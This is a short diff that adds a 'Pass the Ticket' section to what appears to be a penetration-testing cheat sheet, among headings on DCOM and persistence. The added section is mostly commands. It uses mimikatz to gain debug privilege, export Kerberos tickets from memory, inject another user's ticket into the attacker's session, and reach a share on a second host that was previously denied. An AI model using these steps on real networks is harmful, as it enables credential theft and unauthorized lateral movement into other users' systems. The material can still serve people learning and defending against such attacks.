@@ -104,6 +104,24 @@ cmd > hostname # otherhostname
 
 ### Pass the Ticket
 
+Context:
+- attacker connected as user1 on host1
+- user2 is connected on host2
+Goal:
+- steal user2's Ticket Granting Service in memory and inject it in user1's session. Then connect as user1 on host2 using user2's ticket
+
+```
+PS > whoami # user1
+PS > ls \\host2\someshare # access denied
+PS > c:\path\to\mimikatz
+mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+PS > dir *.kirbi # file with the tickets
+mimikatz # kerberos::ptt ticket_from_the_kirbi_file.kirbi
+PS > klist # lists the tickets, user2 should appear
+PS > ls \\host2\someshare # access granted
+```
+
 ### DCOM
 
 ## Persistence
